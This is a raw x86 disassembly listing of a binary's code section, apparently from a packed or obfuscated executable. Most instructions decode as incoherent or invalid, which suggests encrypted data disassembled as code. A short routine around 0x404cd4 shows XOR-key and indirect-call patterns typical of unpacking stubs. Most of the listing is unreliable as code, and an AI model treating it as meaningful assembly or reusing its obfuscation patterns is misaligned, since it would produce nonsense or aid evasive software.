  404913:	dec    eax
  404914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404915:	jl     0x404962
  404917:	sub    DWORD PTR [edi],esi
  404919:	cld    
  40491a:	mov    edx,DWORD PTR ss:[ebx]
  40491d:	out    dx,al
  40491e:	sbb    eax,0xcc4806ee
  404923:	add    cl,BYTE PTR [edx]
  404925:	xchg   edi,eax
  404926:	push   edi
  404927:	and    ah,dl
  404929:	je     0x404921
  40492b:	cmp    eax,DWORD PTR [esi-0x5b]
  40492e:	sar    DWORD PTR [esi+0x7e],1
  404931:	lock jle 0x404956
  404934:	fist   WORD PTR [edx+eax*4-0x2c9207fc]
  40493b:	das    
  40493c:	in     eax,dx
  40493d:	xchg   DWORD PTR [ebp+eiz*4-0x64d273c2],esi
  404944:	sbb    edx,esi
  404946:	sub    eax,0xc090026e
  40494b:	test   eax,0xfdf96be7
  404950:	push   esp
  404951:	inc    eax
  404952:	nop
  404953:	or     al,0x47
  404955:	(bad)  
  404956:	cli    
  404957:	fcomp  DWORD PTR [ebx+eax*4-0x27]
  40495b:	push   ebx
  40495c:	pusha  
  40495d:	out    0x64,al
  40495f:	popa   
  404960:	mov    eax,ds:0xc3213188
  404965:	xchg   esi,eax
  404966:	inc    ax
  404968:	rcr    DWORD PTR [ebp+0x2],1
  40496b:	xchg   esp,eax
  40496c:	outs   dx,DWORD PTR ds:[esi]
  40496d:	jl     0x40493b
  40496f:	scas   eax,DWORD PTR es:[edi]
  404970:	rcr    BYTE PTR [edi],1
  404972:	in     al,0xb9
  404974:	or     eax,0xfd4e8d1a
  404979:	sub    ah,al
  40497b:	and    ebp,eax
  40497d:	ret    0xc9f8
  404980:	out    0x1f,al
  404982:	stc    
  404983:	aam    0x3b
  404985:	dec    esp
  404986:	inc    ecx
  404987:	jle    0x404928
  404989:	push   ss
  40498a:	sbb    eax,0x3d25ddd3
  40498f:	xor    edi,DWORD PTR [ebx-0x5270ad2d]
  404995:	push   ds
  404996:	cmp    ebx,DWORD PTR [esi-0x28]
  404999:	not    BYTE PTR [ecx-0x66]
  40499c:	push   edi
  40499d:	(bad)  
  40499e:	sar    BYTE PTR [eax+0x63482a90],1
  4049a4:	aaa    
  4049a5:	xor    eax,0x566d13ed
  4049aa:	mov    al,0x8f
  4049ac:	mov    WORD PTR [ecx-0x42],gs
  4049af:	mov    ss,WORD PTR [ecx+0x62]
  4049b2:	mov    ah,0x8d
  4049b4:	mov    WORD PTR [esi],es
  4049b6:	iret   
  4049b7:	and    eax,0xf993440f
  4049bc:	hlt    
  4049bd:	pop    eax
  4049be:	repz mov eax,0xe2400647
  4049c4:	jne    0x4049d5
  4049c6:	arpl   WORD PTR [ebx+0x5d],bx
  4049c9:	out    0xbc,al
  4049cb:	mov    edi,DWORD PTR [eax]
  4049cd:	stc    
  4049ce:	cmp    ch,BYTE PTR fs:[ebx+0x7e]
  4049d2:	sub    eax,0xa0ff7f55
  4049d7:	cmp    esp,DWORD PTR [ebx-0x7e]
  4049da:	ret    0x1971
  4049dd:	xchg   edx,eax
  4049de:	fwait
  4049df:	cmp    cl,BYTE PTR [eax+0x13]
  4049e2:	loopne 0x404a2f
  4049e4:	or     al,0xdf
  4049e6:	sbb    eax,0xde2de5fe
  4049eb:	xor    ebx,ebp
  4049ed:	or     esp,DWORD PTR [ecx+0x6391c2b2]
  4049f3:	fcomp  DWORD PTR [ebx-0x404bd2b1]
  4049f9:	mov    dh,0xa1
  4049fb:	xor    ebp,DWORD PTR [edi+0x30]
  4049fe:	int3   
  4049ff:	fisub  DWORD PTR [edi]
  404a01:	mov    dl,0xf4
  404a03:	push   0xfed54c37
  404a08:	dec    esi
  404a09:	and    DWORD PTR [edx+ebx*1+0x50],ebx
  404a0d:	inc    eax
  404a0e:	neg    DWORD PTR [ebp-0x16]
  404a11:	mov    ebp,edx
  404a13:	or     eax,0x6bf24c0f
  404a18:	jb     0x404a01
  404a1a:	jg     0x4049ab
  404a1c:	push   ecx
  404a1d:	pop    edx
  404a1e:	add    al,0x86
  404a20:	xor    al,BYTE PTR [edi+edx*2]
  404a23:	popf   
  404a24:	test   BYTE PTR [edx*4+0x2facbd3],ah
  404a2b:	push   ebp
  404a2c:	stos   DWORD PTR es:[edi],eax
  404a2d:	mov    eax,0xffa3c04e
  404a32:	inc    ebp
  404a33:	or     al,0xe9
  404a35:	ds stc 
  404a37:	(bad)  
  404a38:	(bad)  
  404a39:	jmp    0x404b7e
  404a3e:	cmp    eax,0xf1133703
  404a43:	xor    ebx,ecx
  404a45:	sar    DWORD PTR [edx+esi*1+0x9],1
  404a49:	cld    
  404a4a:	call   0x246f0c16
  404a4f:	and    DWORD PTR [eax+0x70],esi
  404a52:	sbb    BYTE PTR [edi+0x70],bh
  404a55:	jo     0x404a61
  404a57:	addr16 in al,dx
  404a59:	and    eax,0xd08ac63
  404a5e:	dec    eax
  404a5f:	mov    eax,DWORD PTR [eax]
  404a61:	inc    edi
  404a62:	pop    ds
  404a63:	mov    edi,0xc0201b0c
  404a68:	adc    BYTE PTR [eax+0x5e722f6d],bl
  404a6e:	out    dx,eax
  404a6f:	ror    esi,1
  404a71:	add    BYTE PTR [ebp+edx*8+0x7b],bh
  404a75:	pop    esi
  404a76:	mov    ds:0x74f19797,eax
  404a7b:	inc    esi
  404a7c:	loopne 0x404a23
  404a7e:	retf   0x979
  404a81:	jb     0x404a38
  404a83:	xor    al,0xe9
  404a85:	or     eax,0xe2543c19
  404a8a:	mov    edi,0xf45c026c
  404a8f:	aaa    
  404a90:	in     al,0x94
  404a92:	daa    
  404a93:	shl    DWORD PTR [edi-0x34],cl
  404a96:	jmp    0xd560:0x54887af
  404a9d:	mov    eax,0x30de67ba
  404aa2:	jl     0x404b0e
  404aa4:	or     al,0x85
  404aa6:	repnz sbb cl,BYTE PTR [edi+0xa]
  404aaa:	jo     0x404b1f
  404aac:	xor    al,0xf8
  404aae:	in     eax,dx
  404aaf:	and    eax,DWORD PTR [eax]
  404ab1:	adc    al,0x20
  404ab3:	xchg   edi,eax
  404ab4:	out    dx,al
  404ab5:	jb     0x404a98
  404ab7:	sbb    eax,0xc4c9884d
  404abc:	sub    edi,DWORD PTR [ebp-0x2e]
  404abf:	sub    ch,BYTE PTR [ebp+0x7b7850e7]
  404ac5:	ficom  DWORD PTR [esi]
  404ac7:	and    eax,0xb745c5e3
  404acc:	inc    edx
  404acd:	inc    ebx
  404ace:	sub    ecx,eax
  404ad0:	leave  
  404ad1:	ja     0x404ac9
  404ad3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ad4:	xchg   esp,eax
  404ad5:	mov    ch,0x3b
  404ad7:	xchg   ebx,eax
  404ad8:	les    edx,FWORD PTR [ebp+0x1544ca61]
  404ade:	(bad)  
  404adf:	in     eax,0xc4
  404ae1:	sti    
  404ae2:	xchg   esp,eax
  404ae3:	cs pop edx
  404ae5:	rcl    esi,cl
  404ae7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ae8:	xchg   dl,ch
  404aea:	jge    0x404b11
  404aec:	out    0xbc,al
  404aee:	or     ah,dl
  404af0:	shl    DWORD PTR [eax+0x31],1
  404af3:	cdq    
  404af4:	outs   dx,DWORD PTR ds:[esi]
  404af5:	inc    esi
  404af6:	or     eax,edx
  404af8:	xchg   edi,eax
  404af9:	jle    0x404ac6
  404afb:	fisubr WORD PTR [esi]
  404afd:	clc    
  404afe:	ins    DWORD PTR es:[edi],dx
  404aff:	mov    esp,0x6a1d9436
  404b04:	mov    bl,0xf1
  404b06:	mov    eax,DWORD PTR [esi+0x3e]
  404b09:	(bad)  
  404b0a:	aam    0xe7
  404b0c:	mov    edi,0x661eeeff
  404b11:	js     0x404ad7
  404b13:	in     eax,0xca
  404b15:	test   eax,0xd9eb7329
  404b1a:	imul   edx,eax,0xa9cabf16
  404b20:	(bad)  
  404b21:	inc    edx
  404b22:	xchg   edi,eax
  404b23:	pop    eax
  404b24:	and    DWORD PTR [esi-0x25],esi
  404b27:	mov    bh,0xa
  404b29:	fadd   DWORD PTR [ebx+0x2746224e]
  404b2f:	cwde   
  404b30:	aam    0x3e
  404b32:	cld    
  404b33:	stos   BYTE PTR es:[edi],al
  404b34:	dec    edx
  404b35:	add    DWORD PTR [eax+0x7462d8ac],ebx
  404b3b:	jno    0x404b60
  404b3d:	jo     0x404b99
  404b3f:	push   ss
  404b40:	inc    ecx
  404b41:	stos   BYTE PTR es:[edi],al
  404b42:	into   
  404b43:	(bad)  
  404b44:	call   DWORD PTR [edx]
  404b46:	pop    esi
  404b47:	dec    esi
  404b48:	inc    ebx
  404b49:	test   DWORD PTR [edi-0x44c8c48b],esi
  404b4f:	and    al,0x18
  404b51:	push   esi
  404b52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b53:	inc    eax
  404b54:	das    
  404b55:	mov    ebx,0x10bbe989
  404b5a:	sbb    BYTE PTR [edi-0xf],bl
  404b5d:	stos   BYTE PTR es:[edi],al
  404b5e:	shr    esi,0x17
  404b61:	mov    ecx,0x5ec453da
  404b66:	ret    0x629
  404b69:	mov    dh,0x92
  404b6b:	or     DWORD PTR [ebp+edi*2+0x14dc2bd9],0xfab50a36
  404b76:	push   0xffffffc0
  404b78:	cs stos BYTE PTR es:[edi],al
  404b7a:	scas   eax,DWORD PTR es:[edi]
  404b7b:	inc    ebp
  404b7c:	std    
  404b7d:	add    ecx,DWORD PTR [ebx-0x3ecc0fbb]
  404b83:	mov    ecx,DWORD PTR [ebp+0x10]
  404b86:	add    eax,esi
  404b88:	jmp    0x404ccd
  404b8d:	pop    esi
  404b8e:	adc    BYTE PTR [esi-0x8],bh
  404b91:	mov    esi,0x9ce666a6
  404b96:	es icebp 
  404b98:	xor    eax,0x5ea71ed2
  404b9d:	int3   
  404b9e:	and    BYTE PTR [eax+0x70],dh
  404ba1:	sbb    BYTE PTR [edi+0x70],bh
  404ba4:	jo     0x404c0f
  404ba6:	sbb    al,0x8e
  404ba8:	xchg   edi,eax
  404ba9:	cmp    BYTE PTR [ebx+0x57a3f152],0x55
  404bb0:	and    eax,0xdd0c4b75
  404bb5:	clc    
  404bb6:	lds    ebp,FWORD PTR [esi-0x51]
  404bb9:	popf   
  404bba:	popf   
  404bbb:	enter  0xfead,0x52
  404bbf:	(bad)  
  404bc0:	jno    0x404b91
  404bc2:	push   ss
  404bc3:	repz std 
  404bc5:	mov    ecx,0xd93056b4
  404bca:	and    eax,0xa928ad2b
  404bcf:	jle    0xa9dcfe67
  404bd5:	sahf   
  404bd6:	xchg   edx,eax
  404bd7:	sbb    al,BYTE PTR [ecx-0x47]
  404bda:	cs push cs
  404bdc:	mov    ecx,DWORD PTR [esi+0x55]
  404bdf:	aam    0xd5
  404be1:	mov    ecx,esi
  404be3:	cmp    al,bh
  404be5:	xor    BYTE PTR [edx+0xb],bh
  404be8:	sbb    dh,BYTE PTR ds:0xe54fedf8
  404bee:	das    
  404bef:	addr16 cdq 
  404bf1:	sub    eax,0xe942b126
  404bf6:	adc    dl,dl
  404bf8:	push   ss
  404bf9:	pusha  
  404bfa:	lea    ebx,[esi+edi*8+0x40d8135a]
  404c01:	push   esi
  404c02:	nop
  404c03:	inc    eax
  404c04:	cwde   
  404c05:	outs   dx,BYTE PTR ds:[esi]
  404c06:	aas    
  404c07:	and    eax,0x67c0452
  404c0c:	xchg   ebp,eax
  404c0d:	lock sbb al,0x81
  404c10:	xchg   edx,eax
  404c11:	add    esp,esi
  404c13:	mov    eax,ds:0x2fea47de
  404c18:	out    dx,eax
  404c19:	and    dx,dx
  404c1c:	lods   eax,DWORD PTR ds:[esi]
  404c1d:	inc    ebx
  404c1e:	enter  0x9afb,0xd
  404c22:	ins    BYTE PTR es:[edi],dx
  404c23:	dec    esp
  404c24:	rcr    ah,1
  404c26:	cmp    ebp,esp
  404c28:	test   al,0x23
  404c2a:	clc    
  404c2b:	push   ebx
  404c2c:	ja     0x404c0e
  404c2e:	push   ebp
  404c2f:	mov    DWORD PTR [ebx-0x3],esp
  404c32:	fdivr  QWORD PTR [esi+0x76a92694]
  404c38:	mov    eax,ds:0xe3b072c3
  404c3d:	and    al,0xff
  404c3f:	shr    al,0x10
  404c42:	xchg   BYTE PTR [ecx+ecx*2-0x6c23b501],ch
  404c49:	and    eax,0x3e3dc6f6
  404c4e:	mov    ss,esp
  404c50:	and    al,0xd4
  404c52:	cli    
  404c53:	push   edi
  404c54:	mov    ah,0x6b
  404c56:	sub    BYTE PTR es:[ecx+edi*2],bl
  404c5a:	jae    0x404be2
  404c5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c5d:	stos   DWORD PTR es:[edi],eax
  404c5e:	inc    ebx
  404c5f:	ret    
  404c60:	jae    0x404bf6
  404c62:	fnstsw WORD PTR [eax+0x7]
  404c65:	repz or BYTE PTR [ecx],ah
  404c68:	push   ebp
  404c69:	and    eax,0x10fdd280
  404c6e:	in     al,dx
  404c6f:	mov    ah,0x6c
  404c71:	mov    eax,ds:0x17649846
  404c76:	inc    esp
  404c77:	test   eax,0x3087fba9
  404c7c:	cmp    DWORD PTR [edx+0x5ceef274],edx
  404c82:	frstor [edx-0x74101055]
  404c88:	es dec ebp
  404c8a:	test   DWORD PTR ds:0x139303f9,0xef52f86a
  404c94:	add    al,0x76
  404c96:	popf   
  404c97:	loop   0x404c58
  404c99:	mov    esp,0x800d3b28
  404c9e:	jae    0x404cea
  404ca0:	lea    esp,[eax+0x40]
  404ca3:	mov    ebx,0xa2fcafb9
  404ca8:	popf   
  404ca9:	imul   eax,DWORD PTR [ebp+0x21f75f7d],0xffffff99
  404cb0:	imul   esp,eax,0x65
  404cb3:	gs add dl,dh
  404cb6:	push   ecx
  404cb7:	mov    cl,0x8f
  404cb9:	pop    eax
  404cba:	adc    al,0xe5
  404cbc:	mov    cl,0x45
  404cbe:	popa   
  404cbf:	or     al,0x76
  404cc1:	(bad)  
  404cc2:	mov    edx,0xf5d35c1f
  404cc7:	lahf   
  404cc8:	enter  0xe2b1,0x90
  404ccc:	ret    0x189
  404ccf:	pop    esi
  404cd0:	leave  
  404cd1:	ret    0xc
  404cd4:	push   ebp
  404cd5:	mov    ebp,esp
  404cd7:	push   ecx
  404cd8:	push   ecx
  404cd9:	sub    DWORD PTR ds:0x432dd6,0x432704
  404ce3:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  404cea:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  404cf1:	and    DWORD PTR ds:0x43437e,0x0
  404cfb:	xor    ecx,ecx
  404cfd:	add    ecx,DWORD PTR ds:0x43437e
  404d03:	inc    ecx
  404d04:	mov    DWORD PTR ds:0x43437e,ecx
  404d0a:	cmp    DWORD PTR ds:0x43437e,0x26
  404d11:	jne    0x404d52
  404d17:	push   DWORD PTR [ebp-0x20]
  404d1a:	push   DWORD PTR [ebp-0x24]
  404d1d:	push   0x434382
  404d22:	push   0x43438e
  404d27:	push   DWORD PTR [ebp-0x28]
  404d2a:	push   0x6ce4
  404d2f:	push   0x479e
  404d34:	push   DWORD PTR [ebp-0xc]
  404d37:	push   DWORD PTR [ebp-0x14]
  404d3a:	push   0x7cf9
  404d3f:	push   0x1b21
  404d44:	push   0x8797
  404d49:	push   DWORD PTR [ebp-0x24]
  404d4c:	call   DWORD PTR ds:0x432c32
  404d52:	cmp    DWORD PTR ds:0x43437e,0x1a
  404d59:	jb     0x404cfb
  404d5f:	neg    edx
  404d61:	mov    eax,DWORD PTR [ebp-0x4]
  404d64:	push   esi
  404d65:	xor    ecx,0x4a51
  404d6b:	mov    esi,DWORD PTR [ebp-0x8]
  404d6e:	mov    edx,0x7510855
  404d73:	xor    eax,edx
  404d75:	xor    esi,edx
  404d77:	mov    ecx,0x32729c
  404d7c:	adc    DWORD PTR ds:0x43441d,0x4006
  404d86:	jmp    0x40500a
  404d8b:	popa   
  404d8c:	sahf   
  404d8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d8e:	mov    fs,WORD PTR [ebx-0x6b]
  404d91:	jno    0x404e04
  404d93:	mov    al,ds:0x9419e646
  404d98:	mov    al,ds:0x2ff4a569
  404d9d:	jo     0x404e0f
  404d9f:	fnstcw WORD PTR [esi+0x70]
  404da2:	jo     0x404de4
  404da4:	in     eax,0xef
  404da6:	arpl   ax,si
  404da8:	xchg   BYTE PTR [ebp-0x45],ch
  404dab:	xchg   edx,eax
  404dac:	pmaddwd mm0,mm1
  404daf:	mov    edi,0x4a06fc57
  404db4:	and    al,ah
  404db6:	pop    edi
  404db7:	retf   
  404db8:	sbb    eax,0x34a27799
  404dbd:	jle    0x404dfc
  404dbf:	sub    eax,0xdaa01196
  404dc4:	jp     0x404deb
  404dc6:	xchg   edi,eax
  404dc7:	daa    
  404dc8:	les    edx,FWORD PTR [ebx+eiz*4]
  404dcb:	ja     0x404e42
  404dcd:	push   esi
  404dce:	mov    ch,0x9b
  404dd0:	add    BYTE PTR [eax-0x6f],cl
  404dd3:	xlat   BYTE PTR ds:[ebx]
  404dd4:	fstp   QWORD PTR [ebx-0x491d4594]
  404dda:	leave  
  404ddb:	push   esi
  404ddc:	scas   al,BYTE PTR es:[edi]
  404ddd:	dec    BYTE PTR [eax+0xe]
  404de0:	idiv   BYTE PTR [edi-0x24]
  404de3:	call   0xa204:0x9423e079
  404dea:	mov    es,WORD PTR [esi-0x3e]
  404ded:	loop   0x404db2
  404def:	add    edi,ebp
  404df1:	mov    ah,0xf2
  404df3:	dec    ebx
  404df4:	xchg   ecx,eax
  404df5:	fwait
  404df6:	mov    al,BYTE PTR [ecx+0x7db16c30]
  404dfc:	les    esi,FWORD PTR [esi-0x49]
  404dff:	lock sub cl,cl
  404e02:	sar    esp,0x48
  404e05:	jno    0x404e21
  404e07:	mov    DWORD PTR [eax],0x3adbb466
  404e0d:	cdq    
  404e0e:	ss pop ebp
  404e10:	pop    ss
  404e11:	or     eax,0xe33b9493
  404e16:	div    DWORD PTR [ecx]
  404e18:	enter  0x920c,0x57
  404e1c:	sbb    esi,DWORD PTR [esp+esi*2]
  404e1f:	add    al,0x25
  404e21:	mov    ds:0x5ed5e236,al
  404e26:	sbb    BYTE PTR [ebx-0x47],dh
  404e29:	push   ss
  404e2a:	(bad)  
  404e2b:	cmc    
  404e2c:	fcom   QWORD PTR ss:[edi-0x4e4896bf]
  404e33:	jno    0x404df1
  404e35:	lods   eax,DWORD PTR ds:[esi]
  404e36:	sub    dl,bh
  404e38:	sub    edi,DWORD PTR [esi+edi*2]
  404e3b:	rol    dh,cl
  404e3d:	out    0x45,eax
  404e3f:	ror    DWORD PTR [eax],0xf3
  404e42:	jp     0x404e4d
  404e44:	mov    al,0xed
  404e46:	xchg   BYTE PTR [edi+0x3a],ch
  404e49:	and    BYTE PTR [ecx+ebx*2],bh
  404e4c:	and    DWORD PTR [eax+0x6897b35c],edx
  404e52:	push   cs
  404e53:	add    eax,esi
  404e55:	inc    BYTE PTR [edx]
  404e57:	sbb    DWORD PTR [ecx-0x4d],edi
  404e5a:	cmp    al,0x75
  404e5c:	jbe    0x404e3b
  404e5e:	mov    ds:0x44f0d011,al
  404e63:	fadd   DWORD PTR [eax-0x3912a390]
  404e69:	sbb    esp,DWORD PTR [ebp-0x286c5bb2]
  404e6f:	jecxz  0x404e69
  404e71:	mov    esp,0x353ea844
  404e76:	sbb    eax,0xf2948edd
  404e7b:	fwait
  404e7c:	mov    cl,0xc
  404e7e:	jno    0x404e87
  404e80:	std    
  404e81:	dec    ebx
  404e82:	lods   al,BYTE PTR ds:[esi]
  404e83:	(bad)  
  404e84:	pop    esi
  404e85:	jmp    0x404e0f
  404e87:	sti    
  404e88:	(bad)  
  404e89:	cli    
  404e8a:	or     BYTE PTR ds:0x11f26c71,0xaa
  404e91:	xchg   ecx,eax
  404e92:	dec    eax
  404e93:	push   ecx
  404e94:	in     eax,dx
  404e95:	sahf   
  404e96:	inc    edi
  404e97:	loope  0x404e69
  404e99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e9a:	inc    eax
  404e9b:	or     dl,BYTE PTR [esi-0x1f]
  404e9e:	scas   al,BYTE PTR es:[edi]
  404e9f:	cmc    
  404ea0:	fisubr DWORD PTR [eax-0x6d795f84]
  404ea6:	inc    edx
  404ea7:	into   
  404ea8:	inc    edx
  404ea9:	enter  0x1b1f,0xb3
  404ead:	iret   
  404eae:	push   esp
  404eaf:	aam    0x4
  404eb1:	mov    eax,ds:0xaeb238ea
  404eb6:	popf   
  404eb7:	cwde   
  404eb8:	jb     0x404edc
  404eba:	popa   
  404ebb:	cmp    esi,eax
  404ebd:	dec    ecx
  404ebe:	das    
  404ebf:	int    0x8a
  404ec1:	out    dx,eax
  404ec2:	push   0x309665ff
  404ec7:	and    bl,BYTE PTR [esp+eiz*4-0x71d940c8]
  404ece:	sub    DWORD PTR [edi-0x53fdf4d7],ebp
  404ed4:	jmp    0x404f06
  404ed6:	shl    BYTE PTR [esi+esi*8],0x87
  404eda:	stos   BYTE PTR es:[edi],al
  404edb:	out    dx,al
  404edc:	cmp    ebx,ebx
  404ede:	push   ds
  404edf:	mov    ecx,0x3eb955a5
  404ee4:	aam    0xeb
  404ee6:	popf   
  404ee7:	jmp    0x404efc
  404ee9:	mov    ebx,0x6f4fa149
  404eee:	les    esp,FWORD PTR [ebp+0xcfabe79]
  404ef4:	inc    ebx
  404ef5:	xchg   ebp,eax
  404ef6:	out    0x6a,al
  404ef8:	ja     0x404f2f
  404efa:	xor    edi,ebx
  404efc:	inc    esp
  404efd:	xchg   DWORD PTR [esi],esp
  404eff:	mov    bh,cl
  404f01:	xchg   DWORD PTR [edi+0x2049788],ebx
  404f07:	mov    DWORD PTR [ebx],edx
  404f09:	and    eax,0xc8d3ee8c
  404f0e:	cmc    
  404f0f:	pop    ebx
  404f10:	inc    ecx
  404f11:	retf   0x70cc
  404f14:	int3   
  404f15:	sub    edi,esp
  404f17:	loop   0x404f06
  404f19:	add    DWORD PTR [ebx+0x1b398d35],ecx
  404f1f:	out    dx,al
  404f20:	and    BYTE PTR gs:[esi+0x71],bl
  404f24:	inc    DWORD PTR [ecx-0x7a1c0739]
  404f2a:	retf   
  404f2b:	test   al,0xb9
  404f2d:	(bad)  
  404f2e:	and    eax,0x67d6b052
  404f33:	inc    ebp
  404f34:	fs mov ch,0x50
  404f37:	jae    0x404f67
  404f39:	test   BYTE PTR [edi-0x44],al
  404f3c:	inc    eax
  404f3d:	clc    
  404f3e:	and    DWORD PTR [edi],ecx
  404f40:	add    eax,0x70df9cf0
  404f45:	pushf  
  404f46:	stos   DWORD PTR es:[edi],eax
  404f47:	fdivr  DWORD PTR [ecx]
  404f49:	xlat   BYTE PTR ds:[ebx]
  404f4a:	cmp    al,0x2d
  404f4c:	fs push es
  404f4e:	int3   
  404f4f:	pop    es
  404f50:	call   0xbe0:0x1a6cc447
  404f57:	jns    0x404fad
  404f59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f5a:	outs   dx,BYTE PTR ds:[esi]
  404f5b:	mov    ebx,0xf0017e7c
  404f60:	(bad)  
  404f61:	mov    ebp,ss
  404f63:	jbe    0x404f5d
  404f65:	call   0x31ae:0x64040407
  404f6c:	sar    DWORD PTR [esi+0x74],0x2
  404f70:	and    BYTE PTR [ebx],al
  404f72:	fdivr  st,st(5)
  404f74:	out    0xef,al
  404f76:	sub    al,0xca
  404f78:	dec    ecx
  404f79:	fs gs inc esi
  404f7c:	retf   
  404f7d:	hlt    
  404f7e:	pop    ebx
  404f7f:	push   0xb3da2574
  404f84:	into   
  404f85:	ficomp DWORD PTR [edi]
  404f87:	std    
  404f88:	aas    
  404f89:	push   ecx
  404f8a:	sar    BYTE PTR [edx],cl
  404f8c:	sub    ecx,0x8add89bd
  404f92:	aam    0x13
  404f94:	cdq    
  404f95:	inc    edi
  404f96:	mov    ebx,0x80276e
  404f9b:	addr16 inc ecx
  404f9d:	pop    ebp
  404f9e:	sbb    ah,BYTE PTR [edx-0x34215120]
  404fa4:	rol    DWORD PTR [edx],0x41
  404fa7:	scas   eax,DWORD PTR es:[edi]
  404fa8:	aas    
  404fa9:	sub    al,0x5e
  404fab:	repz mov bl,0x28
  404fae:	xor    BYTE PTR [edi+ebp*1],cl
  404fb1:	into   
  404fb2:	ret    
  404fb3:	mov    dl,0x88
  404fb5:	aam    0x79
  404fb7:	(bad)  
  404fb8:	les    esp,FWORD PTR [edi]
  404fba:	inc    edi
  404fbb:	cmp    eax,0x8ceda14
  404fc0:	out    0x77,eax
  404fc2:	popf   
  404fc3:	dec    esi
  404fc4:	and    esp,DWORD PTR [ecx-0x69]
  404fc7:	stos   BYTE PTR es:[edi],al
  404fc8:	jns    0x404fd9
  404fca:	mov    esp,0x6c4545a8
  404fcf:	inc    ecx
  404fd0:	pop    esi
  404fd1:	dec    ebx
  404fd2:	lods   eax,DWORD PTR ds:[esi]
  404fd3:	fdiv   DWORD PTR [ecx+ecx*8+0x3f8fb0ef]
  404fda:	xchg   DWORD PTR [esi],eax
  404fdc:	ins    DWORD PTR es:[edi],dx
  404fdd:	sub    eax,0x927115ce
  404fe2:	push   cs
  404fe3:	retf   
  404fe4:	setge  BYTE PTR [edx-0x20d8fb01]
  404feb:	sbb    al,0x22
  404fed:	aam    0xcb
  404fef:	dec    edi
  404ff0:	mov    ebp,0x2be38844
  404ff5:	hlt    
  404ff6:	xor    dl,BYTE PTR [ebx]
  404ff8:	and    DWORD PTR [ecx+0x13],esp
  404ffb:	jmp    0x57dc:0x80259c2e
  405002:	mov    ebx,esi
  405004:	(bad)
  405007:	sbb    al,0x11
  405009:	cs add esi,ecx
  40500c:	xor    DWORD PTR ds:0x434396,0x260
  405016:	add    eax,ecx
  405018:	imul   eax,esi
  40501b:	mov    DWORD PTR ds:0x43438a,0x336a
  405025:	mov    esi,DWORD PTR [ebp+0xc]
  405028:	mov    DWORD PTR ds:0x434396,0x44f4
  405032:	cmp    esi,eax
  405034:	mov    DWORD PTR ds:0x432dca,0x3ddd
  40503e:	jne    0x4052de
  405044:	mov    eax,DWORD PTR [ebp-0x4]
  405047:	mov    esi,DWORD PTR [ebp-0x8]
  40504a:	xor    eax,edx
  40504c:	jmp    0x4052d0
  405051:	test   DWORD PTR [ebp+0xb],ebx
  405054:	cmp    al,0xf3
  405056:	push   0x55
  405058:	popa   
  405059:	and    DWORD PTR [esi],0x2f
  40505c:	adc    al,0x7
  40505e:	lock inc ecx
  405060:	and    eax,0x70702d5d
  405065:	fnstcw WORD PTR [esi+0x70]
  405068:	jo     0x405063
  40506a:	sbb    ebx,ebx
  40506c:	or     DWORD PTR [edi],0xffffff84
  40506f:	push   edi
  405070:	add    bh,BYTE PTR [ecx-0x69baddd8]
  405076:	push   ss
  405077:	dec    ecx
  405078:	jb     0x405071
  40507a:	outs   dx,BYTE PTR ds:[esi]
  40507b:	sub    edx,DWORD PTR [ebx+0x5946a28f]
  405081:	sub    edx,DWORD PTR [ebp+edi*1-0x11c979b9]
  405088:	int3   
  405089:	retf   0x3c53
  40508c:	into   
  40508d:	xchg   esi,eax
  40508e:	js     0x405078
  405090:	pop    cx
  405092:	in     eax,dx
  405093:	les    ebp,FWORD PTR [eax-0x6a19fdc2]
  405099:	out    0xe,eax
  40509b:	lea    ecx,[edx]
  40509d:	mov    DWORD PTR [esi-0x25],0x1f8b5a2
  4050a4:	mov    WORD PTR [eax+0x42],fs
  4050a7:	inc    eax
  4050a8:	or     al,0xa4
  4050aa:	sti    
  4050ab:	jl     0x4050eb
  4050ad:	dec    eax
  4050ae:	adc    BYTE PTR [eax+0x580eb359],bh
  4050b4:	test   eax,0x57338adf
  4050b9:	inc    edx
  4050ba:	push   eax
  4050bb:	jbe    0x4050af
  4050bd:	xchg   edx,eax
  4050be:	(bad)
  4050c1:	enter  0x34b7,0x26
  4050c5:	add    bl,BYTE PTR [edx-0x46]
  4050c8:	dec    esi
  4050c9:	xor    DWORD PTR [ecx],esp
  4050cb:	lods   eax,DWORD PTR ds:[esi]
  4050cc:	push   0x33
  4050ce:	mov    BYTE PTR es:[ebx-0x16225698],dl
  4050d5:	mov    eax,0x834cbef9
  4050da:	mov    ecx,0x24791c7d
  4050df:	and    DWORD PTR [edx-0x58bc215f],0xfffffff6
  4050e6:	pop    ss
  4050e7:	cmp    al,0xdb
  4050e9:	icebp  
  4050ea:	add    BYTE PTR [edx],dh
  4050ec:	call   0xe1e4f336
  4050f1:	xchg   ebx,eax
  4050f2:	push   ecx
  4050f3:	jmp    0x4050c7
  4050f5:	or     DWORD PTR [ebx],ebx
  4050f7:	enter  0x517,0xa0
  4050fb:	repnz rcr BYTE PTR [ecx],1
  4050fe:	sbb    DWORD PTR [eax],edi
  405100:	das    
  405101:	adc    DWORD PTR [edx-0x69],edx
  405104:	inc    eax
  405105:	sbb    bh,0x7b
  405108:	push   cs
  405109:	in     eax,0x1c
  40510b:	scas   eax,DWORD PTR es:[edi]
  40510c:	and    DWORD PTR [edx-0x1b],esp
  40510f:	jb     0x4050e2
  405111:	out    dx,eax
  405112:	push   esi
  405113:	(bad)
  405118:	leave  
  405119:	jns    0x40513e
  40511b:	call   0xa64e942
  405120:	dec    ebp
  405121:	jb     0x4050e7
  405123:	les    edx,FWORD PTR [esi+0xe]
  405126:	inc    edi
  405127:	inc    edi
  405128:	mov    ch,0x62
  40512a:	cmp    al,0x5e
  40512c:	mov    edx,0x8ae254c7
  405131:	cli    
  405132:	dec    eax
  405133:	test   eax,0xe2574a05
  405138:	inc    esp
  405139:	dec    esp
  40513a:	cmp    bl,BYTE PTR [ebx]
  40513c:	xchg   DWORD PTR [edi+0x35],edi
  40513f:	push   0xa85656b6
  405144:	pop    es
